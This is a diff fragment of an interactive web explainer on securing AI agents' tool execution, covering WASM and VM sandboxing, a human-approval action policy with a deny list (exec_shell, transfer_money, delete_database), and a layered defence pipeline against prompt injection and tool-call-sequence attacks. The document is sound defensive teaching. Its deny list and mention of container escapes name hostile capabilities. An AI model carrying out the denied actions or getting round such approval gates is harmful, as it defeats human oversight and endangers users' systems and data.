+  Docker containers: <span class="hl-err">multiple escape vectors</span>
+  gVisor:           <span class="hl-ok">strong syscall filtering</span>
+  Firecracker:      <span class="hl-ok">strongest VM-level isolation</span>
+  WASM:             <span class="hl-ok">memory-safe, no syscall access</span></div>
+<div class="dp-note n-orange"><strong>Defense insight:</strong> STAC attacks require monitoring the <em>sequence</em> of tool calls, not just individual calls. Implement: (1) tool call sequence logging, (2) anomaly detection on call patterns, (3) data flow tracking (what data moves between tools), (4) rate limiting on sensitive tool combinations.</div>`},
+    5:{title:'WASM Sandboxing for Tool Execution',color:'#7c3aed',body:`
+<div class="dp-label">WebAssembly Isolation Model</div>
+<div class="dp-code"><span class="hl-cmt"># WASM provides memory-safe sandboxing</span>
+
+<span class="hl-cmt"># Key properties:</span>
+<span class="hl-ok">1. Linear memory</span>
+   Each WASM module gets its own memory space.
+   Cannot access host memory or other modules.
+   Buffer overflows stay within the sandbox.
+
+<span class="hl-ok">2. No system calls</span>
+   WASM has no built-in access to filesystem,
+   network, or OS. All capabilities must be
+   explicitly granted by the host.
+
+<span class="hl-ok">3. Capability-based security</span>
+   Host explicitly passes functions the WASM
+   module can call. No implicit permissions.
+
+<span class="hl-ok">4. Near-native performance</span>
+   ~5-15% overhead vs native execution.
+   Much faster than container startup.</div>
+<div class="dp-label">WASM for Agent Tools (Wasmtime Example)</div>
+<div class="dp-code"><span class="hl-key">from</span> wasmtime <span class="hl-key">import</span> Store, Module, Instance, Linker
+
+store = Store()
+linker = Linker(store.engine)
+
+<span class="hl-cmt"># Only expose specific capabilities:</span>
+linker.define_func(<span class="hl-str">"env"</span>, <span class="hl-str">"read_allowed_file"</span>,
+    <span class="hl-ok">read_allowed_file_impl</span>)
+
+<span class="hl-cmt"># Do NOT expose:</span>
+<span class="hl-err"># linker.define_func("env", "exec_shell", ...)</span>
+<span class="hl-err"># linker.define_func("env", "network_request", ...)</span>
+
+module = Module.from_file(store.engine, <span class="hl-str">"tool.wasm"</span>)
+instance = linker.instantiate(store, module)
+
+<span class="hl-cmt"># Tool runs in sandbox — can only call functions
+# explicitly provided by the host.</span></div>
+<div class="dp-note n-violet"><strong>WASM vs containers:</strong> Containers share the host kernel — escape is possible (CVE-2024-21626 runc escape). WASM has no kernel access at all. For agent tool execution, WASM provides stronger isolation with lower overhead. Use containers (gVisor/Firecracker) when tools need OS-level features that WASM can't provide.</div>`},
+    8:{title:'Human-in-the-Loop (HITL) Gates',color:'#2563eb',body:`
+<div class="dp-label">Action Classification System</div>
+<div class="dp-code"><span class="hl-cmt"># Classify every tool action into tiers</span>
+
+<span class="hl-key">ACTION_POLICY</span> = {
+    <span class="hl-cmt"># Tier 1: ALLOW — safe, read-only operations</span>
+    <span class="hl-ok">"allow"</span>: [
+        <span class="hl-str">"search_docs"</span>, <span class="hl-str">"read_file"</span>,
+        <span class="hl-str">"get_weather"</span>, <span class="hl-str">"calculate"</span>,
+    ],
+
+    <span class="hl-cmt"># Tier 2: CONFIRM — requires human approval</span>
+    <span class="hl-str">"confirm"</span>: [
+        <span class="hl-str">"send_email"</span>, <span class="hl-str">"write_file"</span>,
+        <span class="hl-str">"create_ticket"</span>, <span class="hl-str">"update_record"</span>,
+    ],
+
+    <span class="hl-cmt"># Tier 3: DENY — never allowed for the agent</span>
+    <span class="hl-err">"deny"</span>: [
+        <span class="hl-str">"delete_database"</span>, <span class="hl-str">"transfer_money"</span>,
+        <span class="hl-str">"modify_permissions"</span>, <span class="hl-str">"exec_shell"</span>,
+    ],
+}
+
+<span class="hl-key">def</span> execute_tool(tool_name, args, user):
+    tier = get_action_tier(tool_name)
+
+    <span class="hl-key">if</span> tier == <span class="hl-err">"deny"</span>:
+        <span class="hl-key">return</span> <span class="hl-err">"Action not permitted for agents"</span>
+
+    <span class="hl-key">if</span> tier == <span class="hl-str">"confirm"</span>:
+        approved = <span class="hl-ok">request_human_approval</span>(
+            user, tool_name, args,
+            reason=agent.last_reasoning
+        )
+        <span class="hl-key">if not</span> approved:
+            <span class="hl-key">return</span> <span class="hl-str">"Action cancelled by user"</span>
+
+    <span class="hl-key">return</span> sandbox_execute(tool_name, args)</div>
+<div class="dp-note n-blue"><strong>HITL design principles:</strong> <strong>1.</strong> Show the user exactly what the agent wants to do (tool name, arguments, reasoning). <strong>2.</strong> Default to "confirm" for new/unknown tools. <strong>3.</strong> Allow users to promote frequently-approved actions to "allow" tier. <strong>4.</strong> Never allow the agent to modify its own action policy. <strong>5.</strong> Log all approvals and denials for audit.</div>`},
+    10:{title:'Complete Secure Agent Architecture',color:'#16a34a',body:`
+<div class="dp-label">Seven-Layer Secure Agent Pipeline</div>
+<div class="dp-code"><span class="hl-cmt"># Layer 1: Input Guardrails (Ch 6)</span>
+<span class="hl-ok">Scan user prompt for injection attacks</span>
+→ Block prompt injection before agent reasoning
+→ NeMo Guardrails, LLM Guard, Lakera
+
+<span class="hl-cmt"># Layer 2: Tool Allowlist</span>
+<span class="hl-ok">Restrict available tools to what's needed</span>
+→ Q&A bot: search + read only
+→ No exec(), eval(), shell access
+→ Review tool list quarterly
+
+<span class="hl-cmt"># Layer 3: Least Privilege Credentials</span>
+<span class="hl-ok">Scoped, rotated, per-tool credentials</span>
+→ DB tool: read-only on specific tables
+→ File tool: one directory, no executables
+→ API tool: scoped OAuth tokens
+
+<span class="hl-cmt"># Layer 4: Sandbox Execution</span>
+<span class="hl-ok">WASM or gVisor/Firecracker per tool call</span>
+→ Memory isolation, no host access
+→ Resource limits (CPU, memory, time)
+→ Network restrictions (allowlist only)
+
+<span class="hl-cmt"># Layer 5: HITL Gates</span>
+<span class="hl-ok">Human approval for destructive actions</span>
+→ allow / confirm / deny tiers
+→ Show reasoning + arguments to user
+→ Timeout = deny (fail-safe)
+
+<span class="hl-cmt"># Layer 6: Output Validation</span>
+<span class="hl-ok">Validate tool results before returning</span>
+→ Check for data leakage in responses
+→ Verify output matches expected schema
+→ PII scanning on tool outputs
+
+<span class="hl-cmt"># Layer 7: Audit Logging</span>
+<span class="hl-ok">Log every tool call with full context</span>
+→ Timestamp, user, tool, args, result
+→ LLM reasoning chain that triggered call
+→ Enables STAC detection post-hoc</div>
+<div class="dp-note n-green"><strong>The agent security principle:</strong> An agent is only as secure as its most powerful tool with its weakest guardrail. If the agent has a shell execution tool with no sandbox and no HITL gate, all other security layers are irrelevant — one successful prompt injection gives the attacker shell access. Start by removing unnecessary tools (Layer 2), then secure what remains.</div>`},
+  };
+
+  let current=0, playing=false, timer=null;
+  const allSteps=document.querySelectorAll('[data-step]');
+  const progress=document.getElementById('progressFill');
+  const stepLabel=document.getElementById('stepLabel');
+  const dotsBox=document.getElementById('stepDots');
+  const playBtn=document.getElementById('playBtn');
+  const playIcon=document.getElementById('playIcon');
+  const narStep=document.getElementById('narStep');
+  const narText=document.getElementById('narText');
+  const overlay=document.getElementById('detailOverlay');
+  const panel=document.getElementById('detailPanel');
+
+  for(let i=0;i<TOTAL;i++){const d=document.createElement('div');d.className='sc-dot';dotsBox.appendChild(d)}
+  const dots=dotsBox.querySelectorAll('.sc-dot');
+
+  function activate(step){
+    allSteps.forEach(el=>{const s=parseInt(el.dataset.step);el.classList.remove('active','dimmed');if(s===step)el.classList.add('active');else el.classList.add('dimmed')});
+    progress.style.width=((step/TOTAL)*100)+'%';
+    stepLabel.textContent=step+' / '+TOTAL;
+    dots.forEach((d,i)=>d.classList.toggle('filled',i<step));
+    const n=NARRATION[step];
+    if(n){narStep.textContent=step;narStep.style.background=n.color;narText.innerHTML=n.text}
+  }
+
+  function showReset(){
+    allSteps.forEach(el=>el.classList.add('dimmed'));
+    progress.style.width='0%';stepLabel.textContent='- / '+TOTAL;
+    dots.forEach(d=>d.classList.remove('filled'));
+    narStep.textContent='-';narStep.style.background='var(--violet)';
+    narText.innerHTML='Click play or press Space to begin. Click any node for deep-dive details...';
+  }
+
+  function reset(){showReset();current=0}
+  function pause(){if(!playing)return;playing=false;clearTimeout(timer);timer=null;playIcon.textContent='play_arrow'}
+  function play(){if(playing)return;playing=true;playIcon.textContent='pause';if(current>=TOTAL){reset();timer=setTimeout(tick,800)}else{timer=setTimeout(tick,current===0?600:STEP_MS)}}
+  function goTo(step){pause();current=Math.max(0,Math.min(TOTAL,step));if(current===0)showReset();else activate(current)}
+  function stepNext(){if(current<TOTAL)goTo(current+1)}
+  function stepPrev(){if(current>0)goTo(current-1)}
+  function tick(){current++;if(current>TOTAL){pause();return}activate(current);if(playing)timer=setTimeout(tick,STEP_MS)}
+
+  function showDetail(step){
+    const d=DETAILS[step];if(!d)return;
+    document.getElementById('dpStep').style.background=d.color;
+    document.getElementById('dpStep').textContent=step;
+    document.getElementById('dpTitle').textContent=d.title;
+    document.getElementById('dpBody').innerHTML=d.body;
+    overlay.classList.add('visible');panel.classList.add('visible');
+  }
+  function hideDetail(){overlay.classList.remove('visible');panel.classList.remove('visible')}
+
+  document.querySelectorAll('.fnode').forEach(n=>{n.addEventListener('click',()=>{const s=parseInt(n.closest('[data-step]')?.dataset.step);if(s&&DETAILS[s])showDetail(s)})});
+  overlay.addEventListener('click',hideDetail);
+  document.getElementById('dpClose').addEventListener('click',hideDetail);
+  document.addEventListener('keydown',e=>{if(e.key==='Escape')hideDetail()});
+
+  playBtn.addEventListener('click',()=>{if(playing)pause();else play()});
+  document.getElementById('prevBtn').addEventListener('click',stepPrev);
+  document.getElementById('nextBtn').addEventListener('click',stepNext);
+  document.addEventListener('keydown',e=>{if(overlay.classList.contains('visible'))return;if(e.key==='ArrowRight'){e.preventDefault();stepNext()}else if(e.key==='ArrowLeft'){e.preventDefault();stepPrev()}else if(e.key===' '){e.preventDefault();if(playing)pause();else play()}});
+  reset();
+})();
+</script>
+</body>
+</html>
